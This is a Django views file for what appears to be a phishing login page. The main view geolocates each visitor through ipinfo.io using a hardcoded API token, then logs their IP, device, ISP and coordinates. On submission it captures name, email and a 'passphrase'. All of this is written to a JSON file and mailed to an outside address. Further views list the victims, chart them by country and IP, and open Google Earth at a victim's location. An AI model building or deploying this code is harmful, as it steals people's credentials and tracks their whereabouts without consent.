# views.py

import json
import os
import requests
import uuid
from django.db.models import Count
from django.conf import settings
from django.shortcuts import render, HttpResponseRedirect, HttpResponse
from .models import LoginAttempt
from user_agents import parse
from django.core.mail import send_mail

def write_to_json_file(data):
    # Define the path for the JSON file
    file_path = os.path.join(settings.BASE_DIR, 'login_attempts.json')
    
    # Check if file exists and load its content if it does; else, start with an empty list
    if os.path.isfile(file_path):
        with open(file_path, 'r') as file:
            try:
                file_data = json.load(file)
            except json.JSONDecodeError:
                file_data = []
    else:
        file_data = []

    # Append new data and write back to the file
    file_data.append(data)
    with open(file_path, 'w') as file:
        json.dump(file_data, file, indent=4)

def get_browser_and_platform(user_agent):
    user_agent_parsed = parse(user_agent)
    browser = f"{user_agent_parsed.browser.family} {user_agent_parsed.browser.version_string}"
    platform = f"{user_agent_parsed.os.family} {user_agent_parsed.os.version_string}"
    return browser, platform

def login_view(request):
    ip_address = request.META.get('HTTP_X_FORWARDED_FOR') or request.META.get('REMOTE_ADDR')
    api_token = '73a2cba8552cc1'  # Replace with your ipinfo.io API token
    api_url = f'https://ipinfo.io/{ip_address}/json?token={api_token}'
    response = requests.get(api_url)
    browser, platform = get_browser_and_platform(request.META.get('HTTP_USER_AGENT', 'Unknown'))
    
    if response.status_code == 200:
        ip_data = response.json()
        city = ip_data.get('city', 'Unknown')
        region = ip_data.get('region', 'Unknown')
        country = ip_data.get('country', 'Unknown')
        latitude = longitude = None
        loc = ip_data.get('loc', '')
        if loc:
            coordinates = loc.split(',')
            if len(coordinates) == 2:
                try:
                    latitude = float(coordinates[0])
                    longitude = float(coordinates[1])
                except ValueError:
                    pass
        
        isp = ip_data.get('asn', {}).get('name', 'Unknown')
        user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')
        state = ip_data.get('region', 'Unknown')
        referring_url = request.META.get('HTTP_REFERER', 'Unknown')
        timezone = ip_data.get('timezone', 'Unknown')
        request_type = 'GET' if request.method == 'GET' else 'POST'
        name = email = passphrase = None

        if request.method == 'POST':
            name = request.POST.get('name', '')
            email = request.POST.get('email', '')
            passphrase = request.POST.get('comments', '')  # assuming 'comments' is for passphrase

        login_attempt = LoginAttempt.objects.create(
            name=name,
            email=email,
            passphrase=passphrase,
            ip_address=ip_address,
            browser=browser,
            platform=platform,
            isp=isp,
            user_agent=user_agent,
            country=country,
            city=city,
            state=state,
            referring_url=referring_url,
            latitude=latitude,
            longitude=longitude,
            region=region,
            timezone=timezone,
            request_type=request_type,
        )

        # # Data to write to JSON
        # data_to_write = {
        #     "unique_number": generate_unique_identifier(),
        #     "ip": login_attempt.ip_address,
        #     "latitude": latitude,
        #     "longitude": longitude,
        #     "city": login_attempt.city,
        #     "region": login_attempt.region,
        #     "country": login_attempt.country,
        # }

        # # Write to JSON file
        # write_to_json_file(data_to_write)

        # Data to write to JSON
        data_to_write = {
            "unique_number": generate_unique_identifier(),
            "ip_address": login_attempt.ip_address,
            "browser": login_attempt.browser,
            "platform": login_attempt.platform,
            "isp": login_attempt.isp,
            "user_agent": login_attempt.user_agent,
            "country": login_attempt.country,
            "city": login_attempt.city,
            "state": login_attempt.state,
            "referring_url": login_attempt.referring_url,
            "latitude": login_attempt.latitude,
            "longitude": login_attempt.longitude,
            "region": login_attempt.region,
            "timezone": login_attempt.timezone,
            "request_type": login_attempt.request_type,
            "name": login_attempt.name,
            "email": login_attempt.email,
            "passphrase": login_attempt.passphrase,
        }

        # Write to email
        write_to_json_file(data_to_write)

        email_subject = "New Request Recorded"  # Simple subject without newlines
        data_to_mail = json.dumps(data_to_write, indent=4)
        email_message = f"Hello,\n\nA new request has been recorded. Here are the details:\n{data_to_mail}"

        try:
            send_mail(
                subject=email_subject,
                message=email_message,
                from_email=settings.EMAIL_HOST_USER,
                recipient_list=['cihice9484@felibg.com'],  # Replace with actual recipient email
                fail_silently=False,
            )
        except Exception as e:
            # Log the error or handle it accordingly
            print(f"Failed to send email: {str(e)}")

    return render(request, 'login.html')

def redirect_to_map(request, unique_number=None):
    file_path = os.path.join(settings.BASE_DIR, 'login_attempts.json')
    
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
            entry = next((item for item in data if item["unique_number"] == unique_number), None) if unique_number else data[0]
            
            if entry:
                latitude = entry['latitude']
                longitude = entry['longitude']
                # url = f"https://maps.here.com/?map={latitude},{longitude},15,omv"
                url = f"https://earth.google.com/web/@{latitude},{longitude},10000a,35d,0h,0t,0r"
                # Open it in a new tab
                return HttpResponse(f'<script>window.open("{url}");</script>')
            else:
                return HttpResponse("Entry not found.", status=404)
    except FileNotFoundError:
        return HttpResponse("JSON data file not found.", status=404)
    except json.JSONDecodeError:
        return HttpResponse("Error decoding JSON from the file.", status=500)

    return HttpResponse("An unknown error occurred.", status=500)

def list_login_attempts(request):
    file_path = os.path.join(settings.BASE_DIR, 'login_attempts.json')
    try:
        with open(file_path, 'r') as file:
            login_attempts = json.load(file)
            # Reverse the list to display newest first
            login_attempts.reverse()
    except (FileNotFoundError, json.JSONDecodeError):
        login_attempts = []

    return render(request, 'login_attempts_list.html', {'login_attempts': login_attempts})

def generate_unique_identifier():
    return uuid.uuid4().hex

def chart_data_view(request):
    country_data = LoginAttempt.objects.values('country').annotate(total=Count('country')).order_by('-total')
    countries = [entry['country'] for entry in country_data]
    country_counts = [entry['total'] for entry in country_data]

    ip_data = LoginAttempt.objects.values('ip_address').annotate(total=Count('ip_address')).order_by('-total')
    ips = [entry['ip_address'] for entry in ip_data][:10]  # limit to top 10 IPs for readability
    ip_counts = [entry['total'] for entry in ip_data][:10]

    context = {
        'countries': json.dumps(countries),
        'country_counts': json.dumps(country_counts),
        'ips': json.dumps(ips),
        'ip_counts': json.dumps(ip_counts)
    }
    return render(request, 'chart.html', context)

